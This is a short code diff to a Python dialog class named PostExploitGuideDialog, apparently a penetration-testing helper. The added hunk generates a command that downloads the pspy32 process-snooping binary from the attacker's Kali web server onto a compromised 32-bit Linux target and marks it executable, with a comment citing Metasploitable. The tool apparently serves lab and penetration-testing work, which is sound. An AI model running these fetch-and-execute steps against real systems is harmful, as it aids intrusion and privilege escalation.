@@ -1336,6 +1336,20 @@ class PostExploitGuideDialog:
         b64_out_q = _shlex.quote(str(b64_out))
 
         if self._os == "linux":
+            if self._script_name.startswith("pspy"):
+                # pspy ships pspy32 (i386/i686) and pspy64 (x86_64) — both are
+                # downloaded to payloads/.  The wget/curl rows below default to
+                # pspy64; a 32-bit target (`uname -m` = i686 / i386, e.g.
+                # Metasploitable) can't execute pspy64 ("cannot execute binary
+                # file") and needs pspy32.  Both save to the SAME remote path,
+                # so the Step-3 RUN command is unchanged either way.
+                self._cmd_row(
+                    parent, "wget 32-bit:",
+                    f"wget http://{self._kali_ip}:8000/pspy32 "
+                    f"-O {self._remote_path} && chmod +x {self._remote_path}",
+                    hint="Use INSTEAD of 'wget:' below when the target's "
+                         "`uname -m` is i686 / i386 (32-bit).  pspy64 gives "
+                         "'cannot execute binary file' on a 32-bit box.")
             self._cmd_row(
                 parent, "wget:",
                 f"wget http://{self._kali_ip}:8000/{xfer_name} "
